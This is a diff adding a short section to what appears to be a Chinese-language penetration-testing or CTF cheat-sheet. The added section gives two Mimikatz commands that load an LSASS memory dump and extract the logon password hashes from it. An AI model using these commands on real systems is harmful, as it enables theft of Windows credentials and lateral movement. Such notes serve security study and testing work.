@@ -260,3 +260,10 @@ interactive() :                    与shell交互
 basecrack.py -m 自动化处理
 ```
 
+## Mimikatz --dmp文件
+
+```bash
+sekurlsa::minidump lsass.dmp --加载
+sekurlsa::logonpasswords full --导出密码散列值
+```
+
